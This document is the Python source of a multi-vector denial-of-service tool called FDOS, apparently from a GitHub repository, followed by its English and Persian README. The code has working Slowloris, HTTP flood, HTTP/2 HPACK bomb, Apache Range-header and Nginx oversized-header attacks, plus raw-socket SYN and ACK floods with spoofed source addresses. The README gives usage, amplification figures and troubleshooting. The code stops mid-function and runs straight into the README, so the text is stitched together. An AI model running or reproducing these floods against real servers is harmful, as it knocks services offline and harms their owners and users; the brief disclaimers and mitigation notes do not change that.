#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FDOS v5.0 - Ultimate Multi-Vector Attack Tool
With Banner & Colors - Runs Forever
ONLY FOR ISOLATED TEST ENVIRONMENT
"""

import socket
import ssl
import time
import sys
import threading
import random
import struct
import hashlib
import base64
import urllib.parse
import http.client
import re
import json
from typing import Dict, List, Optional, Tuple

# ==================== رنگ‌های ANSI ====================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

def print_color(text: str, color: str = WHITE, bold: bool = False):
    """چاپ متن رنگی"""
    if bold:
        print(f"{BOLD}{color}{text}{RESET}")
    else:
        print(f"{color}{text}{RESET}")

# ==================== بنر ====================

def print_banner():
    """نمایش بنر خفن fdos"""
    banner = f"""
{RED}{BOLD}  ╔══════════════════════════════════════════════════════════════╗
  ║{YELLOW}   ███████╗██████╗  ██████╗ ███████╗                          ║
  ║{YELLOW}   ██╔════╝██╔══██╗██╔═══██╗██╔════╝                          ║
  ║{YELLOW}   █████╗  ██║  ██║██║   ██║███████╗                          ║
  ║{YELLOW}   ██╔══╝  ██║  ██║██║   ██║╚════██║                          ║
  ║{YELLOW}   ██║     ██████╔╝╚██████╔╝███████║                          ║
  ║{YELLOW}   ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝                         
  ║{GREEN}         ╔═══════════════════════════════════════════════╗        ║
  ║{GREEN}         ║  {RED}MULTI-VECTOR ETERNAL ATTACK {GREEN}║        ║
  ║{GREEN}         ║  {YELLOW}10+ Attack Methods Simultaneously  {GREEN}║        ║
  ║{GREEN}         ╚═══════════════════════════════════════════════╝        ║
  ║                                                                      ║
  ║{DIM}                   [ ONLY FOR ISOLATED TEST ]                     ║
  ╚══════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

# ==================== تنظیمات جهانی ====================

TARGET = ""
PORT = 443
USE_TLS = True
STOP_FLAG = False
THREADS_LIST = []

# ==================== ابزارهای کمکی ====================

def random_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def random_port() -> int:
    return random.randint(1024, 65535)

def random_ua() -> str:
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    ]
    return random.choice(agents)

def random_path() -> str:
    paths = [
        '/', '/index.html', '/index.php', '/wp-admin/', '/wp-login.php',
        '/api/v1/users', '/api/v1/products', '/api/v2/orders',
        '/admin/', '/login', '/signup', '/dashboard',
        '/assets/js/main.js', '/assets/css/style.css',
        '/images/logo.png', '/images/banner.jpg',
        '/blog/', '/blog/post/1', '/blog/post/2',
        '/products/', '/products/1', '/products/2',
        '/search?q=' + str(random.randint(1, 999999)),
        '/category/' + str(random.randint(1, 100)),
        '/tag/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
    ]
    return random.choice(paths)

def random_headers() -> Dict:
    return {
        'User-Agent': random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'ar-SA,ar;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate', 'identity']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'public']),
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'X-Originating-IP': random_ip(),
        'Referer': f"http://{TARGET}/" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz/', k=random.randint(5, 15))),
    }


# ==================== اسکنر ====================

def detect_server(target: str, port: int) -> Dict:
    result = {
        'type': 'unknown',
        'version': 'unknown',
        'protocols': ['http1.1'],
        'tls': None,
        'waf': None,
        'os': 'unknown'
    }
    
    try:
        conn = http.client.HTTPConnection(target, port, timeout=5)
        conn.request('HEAD', '/', headers={'User-Agent': 'Mozilla/5.0'})
        resp = conn.getresponse()
        server_header = resp.getheader('Server', '')
        
        if 'nginx' in server_header.lower():
            result['type'] = 'nginx'
            v = re.search(r'nginx/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'apache' in server_header.lower():
            result['type'] = 'apache'
            v = re.search(r'Apache/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'iis' in server_header.lower():
            result['type'] = 'iis'
            v = re.search(r'Microsoft-IIS/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'cloudflare' in server_header.lower():
            result['waf'] = 'cloudflare'
        elif 'sucuri' in server_header.lower():
            result['waf'] = 'sucuri'
        elif 'aws' in server_header.lower() or 'amazon' in server_header.lower():
            result['waf'] = 'AWS'
        conn.close()
    except:
        pass
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        ssl_sock = context.wrap_socket(sock, server_hostname=target)
        result['tls'] = ssl_sock.version()
        cert = ssl_sock.getpeercert()
        if cert and 'subject' in cert:
            for sub in cert['subject']:
                if isinstance(sub, tuple):
                    for item in sub:
                        if item[0] == 'organizationName':
                            result['os'] = item[1]
        ssl_sock.close()
    except:
        pass
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        req = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAQAAAAIAAAAA\r\n\r\n"
        sock.send(req)
        resp = sock.recv(1024)
        if b'101 Switching' in resp or b'Upgrade' in resp or b'h2' in resp:
            result['protocols'].append('http2')
        sock.close()
    except:
        pass
    
    return result


# ==================== حمله‌های لایه‌ی ۷ (HTTP) ====================

def attack_slowloris():
    """حمله‌ی Slowloris - نگه‌داشتن اتصالات ناقص با هدرهای بی‌نهایت"""
    print_color("[ATTACK] Slowloris started", GREEN)
    sockets = []
    
    while not STOP_FLAG:
        # باز کردن اتصالات جدید
        for _ in range(30):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                if USE_TLS:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=TARGET)
                sock.connect((TARGET, PORT))
                sock.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        time.sleep(1)
        
        # ارسال هدرهای تصادفی به اتصالات موجود
        for sock in sockets[:]:
            try:
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,999999)}\r\n".encode())
            except:
                try:
                    sock.close()
                except:
                    pass
                sockets.remove(sock)
        
        # هر ۱۰ ثانیه یه هدر اضافی
        time.sleep(10)
        for sock in sockets[:]:
            try:
                sock.send(f"X-keep: {int(time.time())}\r\n".encode())
            except:
                try:
                    sock.close()
                except:
                    pass
                sockets.remove(sock)


def attack_http_flood():
    """حمله‌ی HTTP Flood با هدرهای تصادفی - تا ابد"""
    print_color("[ATTACK] HTTP Flood started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            
            path = random_path()
            headers = random_headers()
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {TARGET}\r\n"
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # دریافت پاسخ (برای مصرف CPU سرور)
            try:
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            time.sleep(random.uniform(0.001, 0.01))
            
        except:
            pass


def attack_http2_bomb():
    """حمله‌ی HTTP/2 Bomb با HPACK Indexed References"""
    print_color("[ATTACK] HTTP/2 Bomb started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_alpn_protocols(['h2'])
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(30)
            
            # HTTP/2 Preface
            sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            time.sleep(0.1)
            
            # SETTINGS Frame - INITIAL_WINDOW_SIZE = 0
            settings = bytes([
                0x00, 0x00, 0x0c, 0x04, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x04, 0x00, 0x00, 0x00, 0x00
            ])
            sock.send(settings)
            time.sleep(0.1)
            
            # HEADERS Frame with HPACK Bomb
            stream_id = 1
            refs = 100000
            
            headers = bytearray(b'\x00\x00\x00\x01\x04')
            stream_bytes = [
                (stream_id >> 24) & 0xFF,
                (stream_id >> 16) & 0xFF,
                (stream_id >> 8) & 0xFF,
                stream_id & 0xFF
            ]
            headers.extend(stream_bytes)
            
            # HPACK: Literal Header (3 bytes) + 100k references (1 byte each)
            hpack = b'\x40\x61\x00' + (b'\x81' * refs)
            
            h_len = len(hpack)
            headers[0:3] = bytes([
                (h_len >> 16) & 0xFF,
                (h_len >> 8) & 0xFF,
                h_len & 0xFF
            ])
            
            # DATA Frame with END_STREAM
            data = bytes([
                0x00, 0x00, 0x00, 0x00, 0x01,
                stream_bytes[0], stream_bytes[1], stream_bytes[2], stream_bytes[3]
            ])
            
            sock.send(bytes(headers) + hpack + data)
            
            # Keep-alive with WINDOW_UPDATE every 5 seconds
            for _ in range(720):  # 1 hour
                if STOP_FLAG:
                    break
                time.sleep(5)
                window = bytes([
                    0x00, 0x00, 0x04, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01
                ])
                sock.send(window)
            
            sock.close()
            
        except:
            pass


def attack_apache_killer():
    """حمله‌ی مخصوص Apache: Range Header با هزاران بازه"""
    print_color("[ATTACK] Apache Killer started", GREEN)
    
    ranges = []
    for i in range(0, 10000, 1):
        ranges.append(f"{i}-{i+1}")
    
    range_header = f"bytes=0-0, {','.join(ranges[:2000])}"
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            request = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nRange: {range_header}\r\nConnection: close\r\n\r\n"
            sock.send(request.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.01)
            
        except:
            pass


def attack_nginx_killer():
    """حمله‌ی مخصوص Nginx: هدرهای منفجرکننده"""
    print_color("[ATTACK] Nginx Killer started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            # هدرهای ویژه برای Nginx
            big_header = "X-Big: " + "A" * 8192 + "\r\n"
            host_header = f"Host: {TARGET}\r\n"
            
            request = f"GET / HTTP/1.1\r\n{host_header}{big_header * 10}\r\n"
            sock.send(request.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.01)
            
        except:
            pass


def attack_http_pipeline():
    """HTTP Pipelining - چندین درخواست همزمان روی یه کانال"""
    print_color("[ATTACK] HTTP Pipeline started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            pipeline = ""
            for _ in range(100):
                path = random_path()
                headers = random_headers()
                request = f"GET {path} HTTP/1.1\r\nHost: {TARGET}\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                request += "\r\n"
                pipeline += request
            
            sock.send(pipeline.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.001)
            
        except:
            pass


# ==================== حمله‌های لایه‌ی ۴ (TCP/IP) ====================

def attack_syn_flood():
    """SYN Flood با هدرهای IP+TCP خام"""
    print_color("[ATTACK] SYN Flood started (requires root)", YELLOW)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
    except PermissionError:
        print_color("[!] SYN Flood requires root privileges. Skipping...", RED)
        return
    except:
        return
    
    while not STOP_FLAG:
        try:
            src_ip = random_ip()
            src_port = random_port()
            seq = random.randint(0, 0xFFFFFFFF)
            
            # IP Header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0x00, 40, 0x0000, 0x0000,
                64, 6, 0x0000,
                socket.inet_aton(src_ip),
                socket.inet_aton(TARGET)
            )
            
            # TCP Header
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, PORT,
                seq, 0x00000000,
                0x50, 0x02,  # SYN flag
                0xFFFF, 0x0000, 0x0000
            )
            
            sock.sendto(ip_header + tcp_header, (TARGET, 0))
            time.sleep(0.0001)
            
        except:
            pass


def attack_ack_flood():
    """ACK Flood - برای خسته کردن فایروال"""
    print_color("[ATTACK] ACK Flood started (requires root)", YELLOW)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
    except PermissionError:
        print_color("[!] ACK Flood requires root privileges. Skipping...", RED)
        return
    except:
        return
    
    while not STOP_FLAG:
        try:
            src_ip = random_ip()
            src_port = random_port()
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0x00, 40, 0x0000, 0x0000,
                64, 6, 0x0000,
                socket.inet_aton(src_ip),
                socket.inet_aton(TARGET)
            )
            
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, PORT,
                0x00000000, 0x00000000,
                0x50, 0x10,  # ACK flag
                0xFFFF, 0x0000, 0x0000
            )
            
            sock.sendto(ip_header + tcp_header, (TARGET, 0))
            time.sleep(0.0001)
            
        except:
            pass


# ==================== حمله‌های لایه‌ی کاربرد (UDP) ====================

def attack_udp_flood():
    """UDP Flood - ارسال پکت‌های UDP به پورت‌های تصادفی"""
    print_color("[ATTACK] UDP Flood started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ## 📦 Installation

### Clone the Repository
```bash
git clone https://github.com/Agravix/Fdos.git
cd fdos
```

### Requirements
- Python 3.8 or higher
- No external packages required

### Make Executable (Optional)
```bash
chmod +x Fdos.py
```

---

## 🎯 Usage

### Method 1: Direct Arguments
```bash
python3 Fdos.py <target_ip> <port>
```

**Example:**
```bash
python3 Fdos.py 192.168.1.100 443
```

### Method 2: Interactive Mode
```bash
python3 Fdos.py
```
Then enter:
```
Enter target IP or domain: 192.168.1.100
Enter target port (default 443): 443
```

### Example Output
```
  ╔══════════════════════════════════════════════════════════════╗
  ║   ███████╗██████╗  ██████╗ ███████╗                                ║
  ║   ██╔════╝██╔══██╗██╔═══██╗██╔════╝                               ║
  ║   █████╗  ██║  ██║██║   ██║███████╗                          ║
  ║   ██╔══╝  ██║  ██║██║   ██║╚════██║                          ║
  ║   ██║     ██████╔╝╚██████╔╝███████║                          ║
  ║   ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝                          ║
  ║         ╔═══════════════════════════════════════════════╗        ║
  ║         ║  MULTI-VECTOR ETERNAL ATTACK ║        ║
  ║         ║  12+ Attack Methods Simultaneously  ║        ║
  ║         ╚═══════════════════════════════════════════════╝        ║
  ╚══════════════════════════════════════════════════════════════════╝

[SCAN] Detecting server...
[+] Type: nginx 1.29.7
[+] Protocols: http1.1, http2
[+] TLS: TLSv1.3

[START] Launching 12 attack methods...

[+] 13 attack threads running FOREVER!
[+] Press Ctrl+C to stop all attacks.
```

---

## ⚙️ Attack Methods Explained

| Attack | Layer | Description |
|--------|-------|-------------|
| **Slowloris** | L7 | Holds partial HTTP connections open with incomplete headers |
| **HTTP Flood** | L7 | Sends massive GET/POST requests with random headers |
| **HTTP Pipeline** | L7 | Sends 100+ requests per connection (pipelining) |
| **Apache Killer** | L7 | Exploits Range header with 2000+ byte ranges |
| **Nginx Killer** | L7 | Sends huge headers (8KB+ each) to exhaust memory |
| **HTTP/2 Bomb** | L7 | HPACK indexed references (1 byte = 4000 bytes memory) |
| **HTTP/2 PING Flood** | L7 | Sends heavy PING frames to consume CPU |
| **SYN Flood** | L4 | Raw TCP SYN packets with spoofed IPs (requires root) |
| **ACK Flood** | L4 | Raw TCP ACK packets to exhaust firewall/CPU (requires root) |
| **UDP Flood** | L4 | UDP packets to random ports |
| **DNS Amplification** | L4 | DNS ANY queries to public resolvers (amplification) |
| **SSL Renegotiation** | L7 | Forces SSL/TLS renegotiation repeatedly |

---

## 📊 Performance & Amplification

| Attack Method | Impact | Amplification Factor |
|---------------|--------|---------------------|
| HTTP/2 Bomb | Memory Exhaustion | 1 byte → 4 KB |
| Slowloris | Connection Exhaustion | 1 connection → 10MB+ memory |
| Apache Killer | CPU Exhaustion | 1 request → 1000x CPU usage |
| DNS Amplification | Bandwidth Exhaustion | 1 request → 60x response size |
| SYN Flood | Connection Table Fill | 1 packet → 1 connection entry |

---

## 🔧 How It Works

1. **Server Detection**: Automatically scans target to identify server type (Nginx/Apache/IIS), version, supported protocols (HTTP/1.1/HTTP/2), and WAF.

2. **Attack Selection**: Based on detection results, selects optimal attack vectors:
   - HTTP/2 Bomb if server supports HTTP/2
   - Apache/Nginx specific attacks based on server type
   - All L3/L4 attacks run simultaneously

3. **Eternal Execution**: All attacks run in infinite loops until manually stopped.

4. **Resource Management**: Uses thread-based concurrency for maximum throughput.

---

## 🛡️ Defense & Mitigation

If you're a server admin, consider these mitigations:

- **Update Software**: Nginx 1.29.8+, Apache 2.4.68+, IIS latest
- **Disable HTTP/2**: If vulnerable, temporarily disable `http2`
- **Rate Limiting**: Use `limit_req` (Nginx) or `mod_ratelimit` (Apache)
- **Connection Limits**: Set `limit_conn` to prevent Slowloris
- **WAF Rules**: Block anomalous headers (large Range headers, oversized headers)
- **SYN Cookies**: Enable TCP SYN cookies for SYN Flood protection
- **DNS Filtering**: Restrict DNS queries to internal resolvers only

---

## 📁 File Structure

```
fdos/
├── fdos.py          # Main application (contains all code)
├── LICENSE          # Educational license
└── README.md        # This file
```

---

## 🐛 Troubleshooting

### Error: `PermissionError: [Errno 1] Operation not permitted`
- **Cause**: SYN/ACK Flood require raw socket permissions
- **Solution**: Run with `sudo` or skip those attacks

### Error: `ModuleNotFoundError: No module named '...'`
- **Cause**: Missing Python library
- **Solution**: FDOS uses only standard library; upgrade Python to 3.8+

### Attack not working on Nginx 1.29.8+
- **Cause**: Latest Nginx patches HTTP/2 vulnerability
- **Solution**: Tool auto-detects and falls back to other attack methods

---

## ⚖️ License

**Educational Use Only**
This software is for educational purposes only. Unauthorized use is strictly prohibited and violates laws in most jurisdictions. Use only on systems you own or have explicit permission to test.

---

## 📞 Contact

- **GitHub**: [yourusername](https://github.com/Agravix)
- **Telegram**: [@yourtelegram](https://t.me/crcor)

---

## ⭐ Star History

If you find this tool useful for educational purposes, please ⭐ the repository!

---

**DISCLAIMER**: This tool is provided "as is" without warranty of any kind. The author assumes no responsibility for any illegal or unethical use. Always obtain proper authorization before testing any system.

---

---

---

# 🔥 بخش فارسی - FDOS (Fuck DOS)

---

## ⚠️ هشدار قانونی مهم

**این ابزار صرفاً برای اهداف آموزشی و تست امنیتی طراحی شده است.**

- فقط روی سیستم‌هایی که مالکیت دارید یا مجوز تست دارید استفاده کنید.
- استفاده غیرمجاز علیه هر سیستمی **غیرقانونی** است.
- توسعه‌دهنده هیچ مسئولیتی در قبال سوءاستفاده یا آسیب‌های ناشی از این ابزار ندارد.

---

## 🚀 ویژگی‌ها

| ویژگی | توضیح |
|-------|-------|
| **۱۲+ روش حمله** | Slowloris، HTTP Flood، HTTP/2 Bomb، Apache Killer، Nginx Killer، SYN Flood، ACK Flood، UDP Flood، DNS Amplification، SSL Renegotiation، HTTP/2 PING Flood، HTTP Pipeline |
| **تشخیص خودکار** | تشخیص خودکار نوع سرور (Nginx/Apache/IIS) و پروتکل‌ها (HTTP/1.1/HTTP/2) |
| **حالت جاویدان** | تا ابد اجرا میشه تا زمانی که خودتان متوقفش کنید (Ctrl+C) |
| **چند-نخی** | همه حملات به‌صورت همزمان در نخ‌های جداگانه اجرا می‌شوند |
| **خروجی رنگی** | خروجی کنسول با رنگ‌های ANSI و بنر ASCII خفن |
| **ورودی دوطرفه** | هم از طریق آرگومان‌های خط فرمان و هم به‌صورت تعاملی |
| **بدون وابستگی خارجی** | فقط از کتابخانه‌های استاندارد پایتون استفاده می‌کند |
| **ضریب بزرگنمایی بالا** | برخی حملات تا ۵۷۰۰ برابر بزرگنمایی دارند |

---

## 📦 نصب و راه‌اندازی

### کلون کردن مخزن
```bash
git clone https://github.com/Agravix/fdos.git
cd fdos
```

### پیش‌نیازها
- پایتون نسخه ۳.۸ یا بالاتر
- بدون نیاز به کتابخانه‌های اضافی

### قابل اجرا کردن (اختیاری)
```bash
chmod +x Fdos.py
```

---

## 🎯 نحوه استفاده

### روش اول: با آرگومان‌های مستقیم
```bash
python3 Fdos.py <آی‌پی_هدف> <پورت>
```

**مثال:**
```bash
python3 Fdos.py 192.168.1.100 443
```

### روش دوم: حالت تعاملی
```bash
python3 Fdos.py
```
سپس وارد کنید:
```
Enter target IP or domain: 192.168.1.100
Enter target port (default 443): 443
```

---

## ⚙️ روش‌های حمله به‌طور کامل

| حمله | لایه | توضیح |
|------|------|-------|
| **Slowloris** | L7 | نگه‌داشتن اتصالات HTTP ناقص با هدرهای بی‌نهایت |
| **HTTP Flood** | L7 | ارسال درخواست‌های GET/POST عظیم با هدرهای تصادفی |
| **HTTP Pipeline** | L7 | ارسال ۱۰۰+ درخواست در یک اتصال |
| **Apache Killer** | L7 | سوءاستفاده از هدر Range با ۲۰۰۰+ محدوده بایت |
| **Nginx Killer** | L7 | ارسال هدرهای غول‌پیکر (۸ کیلوبایت+ هر کدام) |
| **HTTP/2 Bomb** | L7 | ارجاع‌های ایندکس‌شده HPACK (۱ بایت = ۴۰۰۰ بایت حافظه) |
| **HTTP/2 PING Flood** | L7 | ارسال PING‌های سنگین برای مصرف CPU |
| **SYN Flood** | L4 | پکت‌های TCP SYN خام با IP جعلی (نیاز به روت) |
| **ACK Flood** | L4 | پکت‌های TCP ACK خام برای خسته کردن فایروال (نیاز به روت) |
| **UDP Flood** | L4 | پکت‌های UDP به پورت‌های تصادفی |
| **DNS Amplification** | L4 | درخواست‌های DNS ANY به رزولورهای عمومی (بزرگنمایی) |
| **SSL Renegotiation** | L7 | اجبار به مذاکره مجدد SSL/TLS به‌طور مکرر |

---

## 📊 عملکرد و بزرگنمایی

| روش حمله | تاثیر | ضریب بزرگنمایی |
|----------|-------|---------------|
| HTTP/2 Bomb | خالی کردن حافظه | ۱ بایت → ۴ کیلوبایت |
| Slowloris | خالی کردن اتصالات | ۱ اتصال → ۱۰+ مگابایت حافظه |
| Apache Killer | خالی کردن CPU | ۱ درخواست → ۱۰۰۰ برابر مصرف CPU |
| DNS Amplification | خالی کردن پهنای باند | ۱ درخواست → ۶۰ برابر سایز پاسخ |
| SYN Flood | پر کردن جدول اتصالات | ۱ پکت → ۱ ورودی جدول اتصالات |

---

## 🔧 نحوه عملکرد داخلی

۱. **تشخیص سرور**: اسکن خودکار هدف برای شناسایی نوع سرور (Nginx/Apache/IIS)، نسخه، پروتکل‌های پشتیبانی شده (HTTP/1.1/HTTP/2) و WAF.

۲. **انتخاب حمله**: بر اساس نتایج تشخیص، بردارهای حمله بهینه انتخاب می‌شوند:
   - HTTP/2 Bomb اگر سرور HTTP/2 پشتیبانی کند
   - حملات مخصوص Apache/Nginx بر اساس نوع سرور
   - تمام حملات L3/L4 به‌صورت همزمان اجرا می‌شوند

۳. **اجرای جاویدان**: همه حملات در حلقه‌های بی‌نهایت تا زمان توقف دستی اجرا می‌شوند.

۴. **مدیریت منابع**: از هم‌روندی مبتنی بر نخ برای حداکثر توان عملیاتی استفاده می‌کند.

---

## 🛡️ دفاع و کاهش آسیب‌پذیری

اگر مدیر سرور هستید، این راهکارها را در نظر بگیرید:

- **به‌روزرسانی نرم‌افزار**: Nginx 1.29.8+، Apache 2.4.68+، IIS آخرین نسخه
- **غیرفعال کردن HTTP/2**: در صورت آسیب‌پذیری، موقتاً `http2` را غیرفعال کنید
- **محدودیت نرخ**: استفاده از `limit_req` (Nginx) یا `mod_ratelimit` (Apache)
- **محدودیت اتصال**: تنظیم `limit_conn` برای جلوگیری از Slowloris
- **قوانین WAF**: مسدود کردن هدرهای غیرعادی (هدرهای بزرگ Range، هدرهای بزرگ)
- **کوکی‌های SYN**: فعال کردن TCP SYN cookies برای محافظت در برابر SYN Flood
- **فیلتر DNS**: محدود کردن درخواست‌های DNS فقط به رزولورهای داخلی

---

## 📁 ساختار فایل‌ها

```
fdos/
├── Fdos.py          # برنامه اصلی (شامل تمام کدها)
├── LICENSE          # مجوز آموزشی
└── README.md        # این فایل
```

---

## 🐛 عیب‌یابی

### خطا: `PermissionError: [Errno 1] Operation not permitted`
- **دلیل**: حملات SYN/ACK Flood نیاز به مجوز سوکت خام دارند
- **راه حل**: با `sudo` اجرا کنید یا از آن حملات صرف‌نظر کنید

### خطا: `ModuleNotFoundError: No module named '...'`
- **دلیل**: کتابخانه پایتون موجود نیست
- **راه حل**: FDOS فقط از کتابخانه استاندارد استفاده می‌کند؛ پایتون را به نسخه ۳.۸+ ارتقا دهید

### حمله روی Nginx 1.29.8+ کار نمی‌کند
- **دلیل**: آخرین نسخه Nginx آسیب‌پذیری HTTP/2 را وصله کرده است
- **راه حل**: ابزار خودکار تشخیص می‌دهد و به روش‌های حمله دیگر باز می‌گردد

---

## ⚖️ مجوز

**فقط برای استفاده آموزشی**
این نرم‌افزار صرفاً برای اهداف آموزشی طراحی شده است. استفاده غیرمجاز اکیداً ممنوع است و در اکثر حوزه‌های قضایی نقض قوانین محسوب می‌شود. فقط روی سیستم‌هایی استفاده کنید که مالکیت دارید یا مجوز تست دارید.

---

## 📞 ارتباط با توسعه‌دهنده

- **گیت‌هاب**: [yourusername](https://github.com/Agravix)
- **تلگرام**: [@yourtelegram](https://t.me/crcor)

---

## ⭐ تاریخچه ستاره‌ها

اگر این ابزار را برای اهداف آموزشی مفید می‌دانید، لطفاً به مخزن ⭐ بدهید!

---

**سلب مسئولیت**: این ابزار "همان‌طور که هست" و بدون هیچ گونه ضمانتی ارائه می‌شود. توسعه‌دهنده هیچ مسئولیتی در قبال استفاده غیرقانونی یا غیراخلاقی ندارد. همیشه قبل از تست هر سیستمی مجوز مناسب دریافت کنید.

---

## 📝 دسکریپشن کوتاه (برای گیت‌هاب - حداکثر ۳۵۰ کاراکتر)

🔥 FDOS (Fuck DOS) - Advanced Multi-Vector Attack Tool with 12+ simultaneous methods (Slowloris, HTTP Flood, HTTP/2 Bomb, Apache/Nginx Killer, SYN/ACK Flood, UDP Flood, DNS Amplification, SSL Renegotiation). Runs forever, auto-detects server, colorful banner. For educational & isolated testing only!
